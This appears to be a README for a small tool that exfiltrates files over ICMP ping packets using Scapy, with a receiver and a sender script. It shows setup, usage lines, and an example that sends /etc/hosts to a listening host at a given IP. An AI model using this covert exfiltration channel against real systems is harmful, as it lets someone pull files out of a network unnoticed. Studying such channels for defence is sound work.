# ICMP-Data-Exfiltration

This program is used to send data over the network within "ICMP Packets", with the help of the "PING" command.
we can send any type of file over the network between two hosts with the help of this script.


## Requirements
Need to have the [Scapy] library installed to sniff packets on the network.

### Installations
```bash 

pip3 install scapy

```

## Examples of How To Use
The program works with two files.

First one "icmp_exfiltration.py", this file we will use as a receiver by running this file we will automatically
start listening for any "ICMP packets" that are coming towards our host machine, once we start receiving packets
this script will automatically decode the message and print it to the display.

Second file "icmp_sendData.py", with the help of this script we can send any type of file we want to another host 
where it is listening for our communication, we just need to provide the destination "IP-Address" and "FILE NAME" 
to the script, and it will automatically convert our data into "HEXADECIMAL" and send it to its destination.

### Help Menu
#### icmp_exfiltration.py
```bash
❯ sudo python3 icmp_exfiltration.py

[!] Usage icmp_exfiltration.py <Interface-Name>                               
```

#### icmp_sendData.py
```bash
❯ sudo python3 icmp_sendData.py

[!] Usage icmp_sendData.py <IP-Address> <File-Name>                            
```

### Usage
#### icmp_exfiltration.py
```bash
❯ sudo python3 icmp_exfiltration.py wlan0

[*] Listening for any incoming connections...

127.0.0.1       localhost
127.0.1.1       Gurpreet06                        
```
First we run the "icmp_exfiltration.py" file specifying which interface we want to listen on.

#### icmp_sendData.py
```bash
❯ python3 icmp_sendData.py 172.16.223.1 /etc/hosts

[+] Trying to send file...

[+] File sent successfully.                        
```
Then from another host we will run the "icmp_sendData.py" script by providing the destination "IP-Address" and "FILE NAME"
and it will automatically send  the file to another host terminal.

